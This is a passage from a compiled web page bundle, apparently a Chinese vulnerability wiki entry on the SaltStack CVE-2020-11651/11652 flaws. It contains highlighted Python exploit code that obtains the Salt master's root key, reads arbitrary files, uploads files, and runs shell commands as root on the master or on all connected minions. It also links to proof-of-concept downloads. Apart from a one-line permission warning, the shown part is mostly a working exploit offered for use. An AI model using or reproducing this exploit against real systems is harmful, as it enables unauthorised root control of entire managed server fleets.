        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Failed to submit job&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    <span class="token keyword">if</span> rets<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;jid&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Successfully scheduled job: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>rets<span class="token punctuation">[</span><span class="token string">&#39;jid&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pwn_exec_all</span><span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> master_ip<span class="token punctuation">,</span> jid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Attemping to execute &#39;{}&#39; on all minions connected to {}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> master_ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    msg <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;key&#39;</span><span class="token punctuation">:</span> root_key<span class="token punctuation">,</span>
        <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;_send_pub&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;cmd.run&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;arg&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token string">&quot;/bin/sh -c &#39;{}&#39;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token string">&#39;tgt&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;*&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;tgt_type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;glob&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;ret&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;jid&#39;</span><span class="token punctuation">:</span> jid
    <span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        rets <span class="token operator">=</span> channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Failed to submit job&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> rets <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] Successfully submitted job to all minions.&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Failed to submit job&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Saltstack exploit for CVE-2020-11651 and CVE-2020-11652&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--master&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-m&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;master_ip&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;127.0.0.1&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--port&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-p&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;master_port&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;4506&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--force&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-f&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;force&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_false&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--debug&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-d&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--run-checks&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;run_checks&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">&#39;store_true&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--read&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-r&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;read_file&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--upload-src&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;upload_src&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--upload-dest&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;upload_dest&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--exec&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;exec&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Run a command on the master&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--exec-all&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;exec_all&#39;</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Run a command on all minions&#39;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.&quot;</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token comment"># Both src and destination are required for uploads</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>upload_src <span class="token keyword">and</span> args<span class="token punctuation">.</span>upload_dest <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>upload_dest <span class="token keyword">and</span> args<span class="token punctuation">.</span>upload_src <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Must provide both --upload-src and --upload-dest&#39;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    channel <span class="token operator">=</span> init_minion<span class="token punctuation">(</span>args<span class="token punctuation">.</span>master_ip<span class="token punctuation">,</span> args<span class="token punctuation">.</span>master_port<span class="token punctuation">)</span>

    check_connection<span class="token punctuation">(</span>args<span class="token punctuation">.</span>master_ip<span class="token punctuation">,</span> args<span class="token punctuation">.</span>master_port<span class="token punctuation">,</span> channel<span class="token punctuation">)</span>
    
    root_key <span class="token operator">=</span> check_CVE_2020_11651<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>
    <span class="token keyword">if</span> root_key<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] root key obtained: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>root_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Failed to find root key...aborting&#39;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>run_checks<span class="token punctuation">:</span>
        <span class="token comment"># Assuming this check runs on the master itself, create a file with &quot;secret&quot; content</span>
        <span class="token comment"># and abuse CVE-2020-11652 to read it.</span>
        top_secret_file_path <span class="token operator">=</span> <span class="token string">&#39;/tmp/salt_cve_teta&#39;</span>
        <span class="token keyword">with</span> salt<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span>top_secret_file_path<span class="token punctuation">,</span> <span class="token string">&#39;w&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>
            fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">&quot;top secret&quot;</span><span class="token punctuation">)</span>

        <span class="token comment"># Again, this assumes we&#39;re running this check on the master itself</span>
        <span class="token keyword">with</span> salt<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">&#39;/var/cache/salt/master/.root_key&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> keyfd<span class="token punctuation">:</span>
            root_key <span class="token operator">=</span> keyfd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

        check_CVE_2020_11652_read_token<span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> top_secret_file_path<span class="token punctuation">)</span>
        check_CVE_2020_11652_read<span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> top_secret_file_path<span class="token punctuation">,</span> root_key<span class="token punctuation">)</span>
        check_CVE_2020_11652_write1<span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> root_key<span class="token punctuation">)</span>
        check_CVE_2020_11652_write2<span class="token punctuation">(</span>debug<span class="token punctuation">,</span> channel<span class="token punctuation">,</span> root_key<span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>top_secret_file_path<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>read_file<span class="token punctuation">:</span>
        pwn_read_file<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> args<span class="token punctuation">.</span>read_file<span class="token punctuation">,</span> args<span class="token punctuation">.</span>master_ip<span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>upload_src<span class="token punctuation">:</span>
        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isabs<span class="token punctuation">(</span>args<span class="token punctuation">.</span>upload_dest<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] Destination path must be relative; aborting&#39;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        pwn_upload_file<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> args<span class="token punctuation">.</span>upload_src<span class="token punctuation">,</span> args<span class="token punctuation">.</span>upload_dest<span class="token punctuation">,</span> args<span class="token punctuation">.</span>master_ip<span class="token punctuation">)</span>


    jid <span class="token operator">=</span> <span class="token string">&#39;{0:%Y%m%d%H%M%S%f}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">:</span>
        pwn_exec<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>master_ip<span class="token punctuation">,</span> jid<span class="token punctuation">)</span>

    <span class="token keyword">if</span> args<span class="token punctuation">.</span>exec_all<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] Lester, is this what you want? Hit ^C to abort.&quot;</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        pwn_exec_all<span class="token punctuation">(</span>channel<span class="token punctuation">,</span> root_key<span class="token punctuation">,</span> args<span class="token punctuation">.</span>exec_all<span class="token punctuation">,</span> args<span class="token punctuation">.</span>master_ip<span class="token punctuation">,</span> jid<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function T(R,O){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,k,r,d,v,n("ul",null,[n("li",null,[n("a",m,[s("https://www.cdxy.me/?p=822"),t(a)])])]),b,n("p",null,[s("下载地址: "),n("a",g,[s("https://github.com/jasperla/CVE-2020-11651-poc"),t(a)])]),_,y,h,w,n("p",null,[s("下载地址: "),n("a",f,[s("https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py"),t(a)])]),q,x,n("p",null,[n("a",E,[s("下载地址"),t(a)])]),C,n("p",null,[n("a",V,[s("下载地址"),t(a)])]),S])}const F=e(l,[["render",T],["__file","Saltstack 远程命令执行漏洞 CVE-2020-11651 11652.html.vue"]]);export{F as default};
